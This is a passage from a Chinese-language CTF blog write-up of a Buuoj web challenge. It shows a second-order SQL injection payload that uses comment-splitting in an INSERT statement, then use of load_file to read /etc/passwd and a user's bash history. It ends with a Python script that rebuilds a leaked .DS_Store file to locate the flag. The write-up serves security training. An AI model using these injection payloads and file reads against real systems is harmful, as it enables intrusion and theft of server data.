    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>关键语句<code>select category from board where id=</code>，comment查询类别会进行直接查询，所以为sql二次注入</p>
<p>留言会进行查询，所以现在就要构造二次注入</p>
<p>语句</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment
            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',
                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',
                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>

即 <span class="token string double-quoted-string">"insert into comment set category = '<span class="token interpolation"><span class="token variable">$category</span></span>', content = '<span class="token interpolation"><span class="token variable">$content</span></span>', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span></code></pre>

<p>其中变量都可控，由于sql中单句换行，<code>#</code>只能注释单行，所以使用<code>/**/</code>注释</p>
<p>变为</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment
            set category = '',content=user(),/*',
                content = '*/#',
                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>

即 <span class="token string double-quoted-string">"insert into comment set category = '',content=user(),/*', content = '*/#', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>

等价于 <span class="token string double-quoted-string">"insert into comment set category = '',content=user(),#', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span></code></pre>

<img src="/article/Buuoj-WEB-Write-up/image-20201223203506275.png" class="" title="image-20201223203506275" loading="lazy">

<img src="/article/Buuoj-WEB-Write-up/image-20201223203606551.png" class="" title="image-20201223203606551" loading="lazy">

<img src="/article/Buuoj-WEB-Write-up/image-20201223203616701.png" class="" title="image-20201223203616701" loading="lazy">

<p>可以执行命令，注入无果， 转而用load_file读取下&#x2F;etc&#x2F;passwd </p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223204451913.png" class="" title="image-20201223204451913" loading="lazy">

<p>www用户有bash执行权限</p>
<p>读取www用户bash历史记录</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223204754524.png" class="" title="image-20201223204754524" loading="lazy">

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp/
<span class="token function">unzip</span> html.zip
<span class="token function">rm</span> <span class="token parameter variable">-f</span> html.zip
<span class="token function">cp</span> <span class="token parameter variable">-r</span> html /var/www/
<span class="token builtin class-name">cd</span> /var/www/html/
<span class="token function">rm</span> <span class="token parameter variable">-f</span> .DS_Store
<span class="token function">service</span> apache2 start</code></pre>

<p>所以<code>/tmp/html</code>目录没删，但是不知道目录文件，只知道有个<code>.DS_Store</code></p>
<p>读取发现是乱码，转用hex编码读取</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223205134946.png" class="" title="image-20201223205134946" loading="lazy">

<p>脚本恢复下</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token triple-quoted-string string">"""
@Time ： 2020/12/23 20:52
@Auth ： gyy
@File ：exp1.py
@Blog：http://err0r.top

"""</span>
<span class="token keyword">import</span> binascii

hexdata <span class="token operator">=</span> <span class="token string">"00000001427564310000100000000800000010000000040A000000000000000000000000000000000000000000000800000008000000000000000000000000000000000000000002000000000000000B000000010000100000730074007200610070496C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000090062006F006F007400730074007200610070496C6F63626C6F62000000100000004600000028FFFFFFFFFFFF00000000000B0063006F006D006D0065006E0074002E007000680070496C6F63626C6F6200000010000000CC0000002800000001FFFF000000000003006300730073496C6F63626C6F62000000100000015200000028FFFFFFFFFFFF0000000000190066006C00610067005F0038003900340036006500310066006600310065006500330065003400300066002E007000680070496C6F63626C6F6200000010000001D800000028FFFFFFFFFFFF0000000000050066006F006E00740073496C6F63626C6F62000000100000004600000098FFFFFFFFFFFF0000000000090069006E006400650078002E007000680070496C6F63626C6F6200000010000000CC0000009800000002FFFF000000000002006A0073496C6F63626C6F62000000100000015200000098FFFFFFFFFFFF000000000009006C006F00670069006E002E007000680070496C6F63626C6F6200000010000001D800000098FFFFFFFFFFFF000000000009006D007900730071006C002E007000680070496C6F63626C6F62000000100000004600000108FFFFFFFFFFFF00000000000600760065006E0064006F0072496C6F63626C6F6200000010000000CC00000108FFFFFFFFFFFF00000000000C00770072006900740065005F0064006F002E007000680070496C6F63626C6F62000000100000015200000108FFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000080B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000002000000001000000400000000100000080000000010000010000000001000002000000000100000400000000000000000100001000000000010000200000000001000040000000000100008000000000010001000000000001000200000000000100040000000000010008000000000001001000000000000100200000000000010040000000000001008000000000000101000000000000010200000000000001040000000000000108000000000000011000000000000001200000000000000140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000100B000000450000040A000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000104445344420000000100000000000000000000000000000000000000000000000200000020000000600000000000000001000000800000000100000100000000010000020000000000000000020000080000001800000000000000000100002000000000010000400000000001000080000000000100010000000000010002000000000001000400000000000100080000000000010010000000000001002000000000000100400000000000010080000000000001010000000000000102000000000000010400000000000001080000000000000110000000000000012000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"</span>

data <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>hexdata<span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">".DS_Store"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

</code></pre>

<p>读取到</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223210658137.png" class="" title="image-20201223210658137" loading="lazy">



<p>直接读取</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223211015299.png" class="" title="image-20201223211015299" loading="lazy">

<p>网鼎杯的题还是很顶的</p>
<p>后记：</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223211725414.png" class="" title="image-20201223211725414" loading="lazy">

<p>然后发现答案错误…</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201223211919615.png" class="" title="image-20201223211919615" loading="lazy">

<p>正确方法是取<code>/var/www/html/</code>下的那个文件读，因为动态靶机的缘故，送flag进靶机没有照顾到这题呀…</p>
<hr>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">如果觉得我的文章对你有帮助，可以请俺喝冰阔落</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/alipay.jpg"><img loading="lazy" src="/images/alipay.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/qq.jpg"><img loading="lazy" src="/images/qq.jpg" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/wechat.jpg"><img loading="lazy" src="/images/wechat.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Err0r</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://err0r.top/article/Buuoj-WEB-Write-up/" title="Buuoj WEB Write-up">https://err0r.top/article/Buuoj-WEB-Write-up/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/article/Netcat/" rel="prev" title="Netcat 网络测试工具"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">Netcat 网络测试工具</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/article/CTFD/" rel="next" title="CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）"><span class="post-nav-text">CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>若您想及时得到回复提醒，建议私发邮件联系。</span><br><span>评论请遵守评论公德，博主会不定时检查评论并进行回复。</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/article/Buuoj-WEB-Write-up/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">苏ICP备20028116号-1</a></div><div class="copyright"><span>&copy; 2020 – 2023 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Err0r</span></div><div class="live-time"><span>本博客已在各种灾难中运行了</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2020-10-20T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
}
blog_live_time();
</script></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#000000" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="想要搜些什么？" value=""></div><div class="search-result-container"></div></div><script>function initMourn() {
  const date = new Date();
  const today = (date.getMonth() + 1) + "-" + date.getDate()
  const mourn_days = ["4-4","9-18","12-13"]
  if (mourn_days.includes(today)) {
    document.documentElement.style.filter = "grayscale(1)";
  }
}
initMourn();</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body></html>